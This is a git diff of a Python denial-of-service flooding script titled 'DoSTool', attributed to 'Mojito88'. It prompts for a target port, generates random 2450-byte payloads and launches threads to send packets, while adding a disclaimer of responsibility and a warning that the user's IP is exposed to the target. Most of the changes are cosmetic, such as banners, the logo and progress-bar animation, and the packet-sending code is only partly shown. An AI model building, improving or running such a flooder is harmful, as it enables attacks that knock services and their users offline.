@@ -1,11 +1,14 @@
-#import
+#################### import ################
 import socket
 import time
 import os
 import random
 from threading import Thread
 from sys import platform
+import requests
 
+
+#################### clear ##################
 if platform == "linux" or platform == "linux2":
     # linux
     os.system("clear")
@@ -19,7 +22,7 @@ elif platform == "win32":
 if not __name__ == "__main__":
     exit()
 
-#colors
+#################### colors ##################
 class ConsoleColors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -28,21 +31,25 @@ class ConsoleColors:
     FAIL = '\033[91m'
     BOLD = '\033[1m'
 
-#logo
+################### logo ##################
     
 print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
- ____       ____  _____           _ 
-|  _ \  ___/ ___||_   _|__   ___ | |
-| | | |/ _ \___ \  | |/ _ \ / _ \| |
-| |_| | (_) |__) | | | (_) | (_) | |
-|____/ \___/____/  |_|\___/ \___/|_|
-    Auth: Mojito88
-    Version: 0.8
+   ____       ____  _____           _ 
+  |  _ \  ___/ ___||_   _|__   ___ | |
+  | | | |/ _ \___ \  | |/ _ \ / _ \| |
+  | |_| | (_) |__) | | | (_) | (_) | |
+  |____/ \___/____/  |_|\___/ \___/|_|
+  
+  Auth: Mojito88
+    Version: 0.7
     I decline any responsibility regarding 
     the use of this as of all other tools.
       ''')
+print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + '''
+ This packets sending is not protected from any proxy/vpn so your ip could be visible to the target
+''')
 
-#script
+#################### #script #################
 def getport():
     try:
         port8 = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Specify Port:\r\n"))
@@ -62,8 +69,7 @@ bytesToSend = random._urandom(2450)
 
 i = 0;
 
-
-#class1
+##################### class1 ###############
 class Count:
     packetCounter = 0 
 
@@ -98,16 +104,20 @@ try:
    ''')
 
     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "INITIALIZATION >> [                    ] 0% ")
-    time.sleep(1)
+    time.sleep(0.8)
+    print ("\033[A                                  \033[A")
     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "INITIALIZATION >> [=====               ] 25%")
-    time.sleep(1)
+    time.sleep(0.8)
+    print ("\033[A                                  \033[A")
     print(ConsoleColors.BOLD + ConsoleColors.WARNING + "INITIALIZATION >> [==========          ] 50%")
-    time.sleep(1)
+    time.sleep(0.8)
+    print ("\033[A                                  \033[A")
     print(ConsoleColors.BOLD + ConsoleColors.WARNING + "INITIALIZATION >> [===============     ] 75%")
-    time.sleep(1)
+    time.sleep(0.8)
+    print ("\033[A                                  \033[A")
     print(ConsoleColors.BOLD + ConsoleColors.FAIL + "INITIALIZATION >> [====================] 100%")
 
-#output
+################### output #######################à
 
     for i in range(threads):
         try:
@@ -121,4 +131,3 @@ except KeyboardInterrupt:
 
 #Thanks if you are using my scipt <3
 #And if you are modifying/editing it.
-
